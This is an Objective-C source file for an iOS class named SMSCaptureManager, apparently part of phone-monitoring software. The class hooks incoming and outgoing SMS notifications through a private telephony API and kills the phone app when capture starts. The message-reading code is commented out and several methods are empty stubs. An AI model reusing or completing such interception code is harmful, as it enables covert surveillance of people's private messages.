/**
 - Project name :  RemoteCommandMager Component
 - Class name   :  SMSCaptureManager
 - Version      :  1.0  
 - Purpose      :  For RemoteCommandMager Component
 - Copy right   :  28/11/2011, Prasad M.B, Vervata Co., Ltd. All rights reserved.
 */

#import "SMSCaptureManager.h"
#import "TelephonyNotificationManagerImpl.h"
#import "CTMessageCenter.h"
@implementation SMSCaptureManager

/**
 - Method name: initWithEventDelegate: initWithEventDelegateinitWithEventDelegate
 - Purpose:This method is used to initialize the SMSCaptureManager class
 - Argument list and description: aEventDelegate (EventDelegate),aTelephonyNotificationManager (TelephonyNotificationManager)
 - Return description: No return type
*/

- (id)initWithEventDelegate:(id <EventDelegate>) aEventDelegate initWithEventDelegateinitWithEventDelegate:(id <TelephonyNotificationManager>) aTelephonyNotificationManager {
	if ((self = [super init])) {
		mEventDelegate = aEventDelegate;
		mTelephonyNotificationManager = aTelephonyNotificationManager;
	}
	return self;
}

- (id) initWithEventDelegate:(id <EventDelegate>) aEventDelegate {
	if ((self = [super init])) {
		mTelephonyNotificationManagerImpl = [[TelephonyNotificationManagerImpl alloc] init];
		[mTelephonyNotificationManagerImpl startListeningToTelephonyNotifications];
		mTelephonyNotificationManager = mTelephonyNotificationManagerImpl;
		mEventDelegate = aEventDelegate;
	}
	return self;
}

- (void) startCapture {
	if (!mListening) {
		system("killall MobilePhone");
		[mTelephonyNotificationManager addNotificationListener:self withSelector:@selector(onIncommingSMS:) forNotification:KSMSMESSAGERECEIVEDNOTIFICATION];
		[mTelephonyNotificationManager addNotificationListener:self withSelector:@selector(onOutGoingSMS:) forNotification:KSMSMESSAGESENTNOTIFICATION];
		mListening = TRUE;
	}
}


- (void) stopCapture {
	
}

- (void) onIncommingSMS: (id) aNotification {
	NSLog(@"onIncommingSMS");
	NSNotification* notification = aNotification;
	NSDictionary* dictionary = [notification userInfo];
	if (dictionary) {
		NSNumber* messageType = [dictionary valueForKey:@"kCTMessageTypeKey"];
		if([messageType isEqualToNumber:[NSNumber numberWithInt:1]])
		{
			NSNumber* messageID = [dictionary valueForKey:@"kCTMessageIdKey"];
			CTMessageCenter* mc = [CTMessageCenter sharedMessageCenter];
			/*CTMessage* msg = [mc incomingMessageWithId:[messageID intValue]];
			//NSObject<CTMessageAddress>* phonenumber = [msg sender];
			
			//NSString *senderNumber = (NSString*)[phonenumber canonicalFormat];
			//NSLog(@"Sender Number:%@",senderNumber);
			NSMutableArray *receip=[msg recipients];
			NSLog(@"Recipients:%@",receip);
			//NSString *sender = (NSString*)[phonenumber encodedString];
			CTMessagePart* msgPart = [[msg items] objectAtIndex:0]; 
			NSLog(@"Message:--->%@",msgPart);
			//for single-part msgs
			NSData *smsData = [msgPart data];
			NSString *smsText = [[NSString alloc] initWithData:smsData encoding:NSUTF8StringEncoding];*/
		}
	}
			
}

- (void) onOutGoingSMS {
	
}


@end
